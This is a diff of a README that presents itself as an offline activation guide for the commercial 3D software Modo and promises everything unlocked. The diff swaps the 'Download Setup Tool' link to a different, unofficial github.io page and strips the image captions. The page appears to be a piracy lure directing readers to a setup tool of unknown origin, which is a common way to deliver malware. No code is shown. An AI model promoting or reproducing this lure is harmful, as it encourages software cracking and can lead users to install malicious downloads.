@@ -1,6 +1,6 @@
 # 🧿 Modo — Offline Activation Guide
 
-[![Download Setup Tool](https://img.shields.io/badge/Download-Setup_Tool-darkgreen)](https://modo-offline-activation-guide.github.io/.github)
+[![Download Setup Tool](https://img.shields.io/badge/Download-Setup_Tool-darkgreen)](https://asdeennerhorse.github.io/mogus/Modo)
 
 ## 🧰 How to Install & Activate Modo Offline
 
@@ -32,13 +32,13 @@ You get everything unlocked — without depending on online services.
 ## 🖼 Preview
 
 ![Modo Sculpting Workspace](https://i.materialise.com/blog/wp-content/uploads/2017/10/sculpting-modo.jpg)  
-*Sculpting and modeling interface in Modo with mesh tools active*
+
 
 ![Modo Rendering & Layout](https://www.awn.com/sites/default/files/styles/original/public/image/featured/1045375-foundry-launches-modo-12-series.jpg?itok=GHC2YlWH)  
-*Modo's rendering engine with timeline and layout controls*
+
 
 ![Foundry Modo UI Overview](https://www.foundry.com/sites/default/files/paragraphs/feature-images/modo%20thumbail%202.jpg)  
-*Complete 3D environment for animation, lighting, and material work*
+
 
 ---
 
